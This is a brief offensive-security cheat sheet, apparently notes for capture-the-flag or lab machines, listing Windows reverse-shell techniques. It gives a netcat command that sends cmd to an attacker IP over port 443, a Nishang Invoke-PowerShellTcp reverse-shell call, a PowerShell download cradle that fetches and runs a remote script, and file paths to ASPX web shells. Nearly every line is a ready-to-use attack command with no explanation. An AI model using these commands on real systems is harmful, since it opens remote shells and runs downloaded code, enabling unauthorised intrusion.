____
# nc.exe

```bash
\\10.10.14.11\smbFolder\nc.exe -e cmd 10.10.14.11 443
```


https://github.com/samratashok/nishang/tree/master/Shells

## Invoke-PowerShellTcp.ps1

https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

Add to the end of the script,

```ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.21 -Port 443
```


```bash
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
```

# aspx shell

/usr/share/seclists/Web-Shells/laudanum-1.0/aspx/shell.aspx

/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
